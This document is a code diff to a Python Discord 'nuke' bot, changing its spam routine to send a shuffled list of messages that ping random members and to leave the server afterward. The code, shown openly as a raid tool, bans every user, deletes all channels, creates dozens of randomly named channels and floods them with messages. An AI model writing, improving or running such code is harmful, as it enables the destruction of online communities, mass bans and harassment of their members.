@@ -6,14 +6,14 @@ stops = []
 
 intents = discord.Intents.all()
 class DiscordBot(commands.Bot):
-    def __init__(self, logId:str, token:str, guildId:int, channelName:str, latency:int, message:str, allUserBan:bool, allChannelDelete:bool):
+    def __init__(self, logId:str, token:str, guildId:int, channelName:str, latency:int, messages:list[str], allUserBan:bool, allChannelDelete:bool):
         super().__init__(intents=intents, command_prefix="!", description="Yaa so good bot\n<<sound:1>>")
         self.logId = logId
         self.token = token
         self.guildId = guildId
         self.channelName = channelName
         self.nukeLatency = latency
-        self.message = message
+        self.messages = messages
         self.allUserBan = allUserBan
         self.allChannelDelete = allChannelDelete
         
@@ -58,7 +58,7 @@ class DiscordBot(commands.Bot):
     async def createChannel(self, channelName:str, guild:discord.Guild):
         channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
         await guild.create_text_channel(channelName)
-    async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=50):
+    async def nuke(self, latency:int, messages:list[str], guild:discord.Guild, channelName:str, numberOfExecutions=50):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
             await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
@@ -70,12 +70,20 @@ class DiscordBot(commands.Bot):
                     await self.close()
                     return
                 logs[self.logId] += "--- Nuke ---\n"
-                bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))
-                await asyncio.gather(*(self.sendMessage(bMessage, channel, latency*0.001) for channel in self.channels))
+                random.shuffle(messages)
+                for message in messages:
+                    bMessage = message
+                    if message == messages[0]:
+                        bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))
+                    bMessage = bMessage.replace("!userId!", str(random.choice(guild.members).id))
+                    await asyncio.gather(*(self.sendMessage(bMessage, channel, latency*0.001) for channel in self.channels))
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
         logs[self.logId] += "---- End ----\n"
-        stops.append(self.logId)
+        try:
+            guild.leave()
+        except:
+            pass
         await self.close()
     async def on_ready(self):
         logs[self.logId] += f"ID:{self.user.id}, Name:{self.user.name}\n\n"
@@ -92,7 +100,7 @@ class DiscordBot(commands.Bot):
             await self.banAllUser(self.guild)
         if self.allChannelDelete:
             await self.deleteAllChannel(self.guild)
-        await self.nuke(self.nukeLatency, self.message, self.guild, self.channelName)
+        await self.nuke(self.nukeLatency, self.messages, self.guild, self.channelName)
     async def on_message(self, message):
         if message.author.bot:
             return
